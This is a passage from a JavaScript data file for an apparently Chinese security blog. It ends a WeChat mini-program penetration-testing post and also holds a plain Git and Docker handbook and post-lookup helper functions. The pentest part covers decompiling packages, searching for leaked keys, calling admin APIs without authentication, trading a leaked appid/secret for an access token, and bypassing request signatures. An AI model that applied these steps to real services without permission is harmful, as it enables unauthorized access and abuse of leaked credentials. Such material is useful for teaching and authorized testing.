1. BurpSuite 监听 127.0.0.1:8080
2. Proxifier 设置代理服务器
3. 配置代理规则：WeChat → 代理
\`\`\`

## 反编译获取源码

### 工具

\`\`\`bash
# unveilr
unveilr target.wxapkg -o output/

# wxappUnpacker
wxappUnpacker target.wxapkg
\`\`\`

## 漏洞挖掘

### 信息泄露

\`\`\`
# 搜索关键字
apikey, secret, token, password, appid

# 正则匹配
# IP地址
(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\. ...

# 手机号码
0?(13|14|15|17|18|19)[0-9]{9}

# 邮箱
\\w[-\\w.+]*@([A-Za-z0-9][-A-Za-z0-9]+\\.)+[A-Za-z]{2,14}
\`\`\`

### 未授权访问

\`\`\`
# 测试所有接口
GET /api/user/list
POST /api/admin/delete

# 无认证访问
\`\`\`

### Appid 和 Secret 利用

\`\`\`bash
# 获取 AccessToken
curl "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=APPID&secret=SECRET"

# 返回
{"access_token":"xxx","expires_in":7200}

# 后续利用
# - 发送消息
# - 获取用户信息
\`\`\`

### 破解 Sign 签名

\`\`\`
# 签名绕过思路
1. 删除 sign 字段尝试
2. 置空 sign 值尝试
3. 反编译查找加密算法
4. 使用相同算法构造 sign
\`\`\`

## 防御

1. 不要硬编码密钥
2. 接口添加鉴权
3. 使用 HTTPS
4. 签名校验
    `
  },
  // 安全开发 - 补充 Git & Docker
  {
    slug: 'git-docker-guide',
    title: 'Git & Docker 运维手册',
    date: '2026-06-08',
    category: 'securedev',
    subcategory: 'devsecops',
    tags: ['DevOps', 'Git', 'Docker', '运维'],
    summary: 'Git 版本控制和 Docker 容器运维实用手册。',
    content: `
## Git 手册

### 基本设置

\`\`\`bash
git config --list                      # 查看配置
git config --global user.name "name"   # 配置用户名
git config --global user.email "email" # 配置邮箱
git init                                # 初始化
git add .                               # 添加所有文件
git commit -m "message"                 # 提交
git status                              # 查看状态
\`\`\`

### 远程仓库

\`\`\`bash
# 添加远程仓库
git remote add origin https://github.com/user/repo.git

# 推送
git push -u origin main

# 拉取
git pull
\`\`\`

### 分支管理

\`\`\`bash
git branch                  # 查看分支
git branch feature          # 创建分支
git checkout feature        # 切换分支
git merge feature           # 合并分支
git branch -d feature       # 删除分支
\`\`\`

## Docker 手册

### 安装

\`\`\`bash
# CentOS
yum install -y yum-utils
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
yum install docker-ce docker-ce-cli containerd.io
systemctl start docker
systemctl enable docker
\`\`\`

### 镜像操作

\`\`\`bash
docker search ubuntu        # 搜索镜像
docker pull ubuntu          # 拉取镜像
docker images               # 查看镜像
docker rmi -f id            # 删除镜像
\`\`\`

### 容器操作

\`\`\`bash
docker ps                   # 查看运行容器
docker ps -a                # 查看所有容器
docker exec -it id bash     # 进入容器
docker logs id              # 查看日志
docker stop id              # 停止容器
docker rm id                # 删除容器
\`\`\`

### Dockerfile

\`\`\`dockerfile
FROM ubuntu:20.04
WORKDIR /app
COPY . .
RUN apt-get update && apt-get install -y python3
CMD ["python3", "app.py"]
\`\`\`

### docker-compose

\`\`\`yaml
version: '3'
services:
  web:
    image: nginx:latest
    ports:
      - "80:80"
  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: root
\`\`\`
    `
  },
]

export function getAllPosts() {
  return posts.sort((a, b) => new Date(b.date) - new Date(a.date))
}

export function getPostBySlug(slug) {
  return posts.find(p => p.slug === slug)
}

export function getPostsByCategory(categoryId) {
  return posts.filter(p => p.category === categoryId)
}

export function getPostsBySubcategory(subcategoryId) {
  return posts.filter(p => p.subcategory === subcategoryId)
}

export function getAllTags() {
  const tags = new Set()
  posts.forEach(p => p.tags.forEach(t => tags.add(t)))
  return Array.from(tags)
}

export function getPostsByTag(tag) {
  return posts.filter(p => p.tags.includes(tag))
}

export function searchPosts(query) {
  const lower = query.toLowerCase()
  return posts.filter(p =>
    p.title.toLowerCase().includes(lower) ||
    p.summary.toLowerCase().includes(lower) ||
    p.content.toLowerCase().includes(lower)
  )
}

export function getCategoryById(id) {
  for (const cat of categories) {
    if (cat.id === id) return cat
    const sub = cat.children?.find(c => c.id === id)
    if (sub) return { ...sub, parent: cat }
  }
  return null
}
